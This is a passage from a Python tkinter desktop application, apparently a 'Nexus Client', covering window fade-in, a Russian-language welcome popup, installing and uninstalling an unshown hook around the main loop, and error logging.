        btn_close.bind("<Enter>", close_enter)
        btn_close.bind("<Leave>", close_leave)

        # ───── FADE-IN ─────
        def fade_in():
            try:
                a = root.attributes("-alpha")
                a = min(a + 0.08, 1.0)
                root.attributes("-alpha", a)
                if a < 1.0:
                    root.after(20, fade_in)
            except Exception:
                pass

        switch_page("Dashboard")
        install_hook()
        root.attributes("-alpha", 0.0)
        root.focus_force()
        fade_in()

        def welcome():
            show_popup(
                root,
                "Добро пожаловать в Nexus!\nКанал: "
                + CHANNEL,
                title="◆ Nexus Client",
                duration=5000,
                color=ACCENT,
                W=W, H=H)

        root.after(1200, welcome)

        try:
            root.mainloop()
        finally:
            uninstall_hook()

    except Exception:
        log_error("MAIN ERROR:\n%s" %
                  traceback.format_exc())


if __name__ == "__main__":
    try:
        main()
    except Exception:
        log_error("ENTRY ERROR:\n%s" %
                  traceback.format_exc())